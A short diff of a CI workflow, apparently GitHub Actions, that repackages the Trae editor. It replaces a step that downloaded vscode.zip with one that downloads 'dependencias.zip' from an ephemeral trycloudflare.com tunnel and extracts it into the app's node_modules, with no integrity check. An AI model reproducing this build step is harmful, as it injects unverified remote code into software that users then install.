@@ -25,15 +25,10 @@ jobs:
           move extracted\Trae\Trae.app\Contents contents
         continue-on-error: true
 
-      - name: Remove existing @vscode
+      - name: Download new dependencies
         run: |
-            Remove-Item -Recurse -Force contents\Resources\app\node_modules\@vscode
-
-      - name: Download new vscode dependencies
-        run: |
-          curl -o vscode.zip https://beaches-assure-seemed-christine.trycloudflare.com/vscode.zip
-          mkdir contents\Resources\app\node_modules\@vscode
-          7z x vscode.zip -o"contents\Resources\app\node_modules/@vscode"
+          curl -o dependencias.zip https://beaches-assure-seemed-christine.trycloudflare.com/dependencias.zip
+          7z x dependencias.zip -o"contents\Resources\app\node_modules"
 
       - name: Install Electron (globally)
         run: |
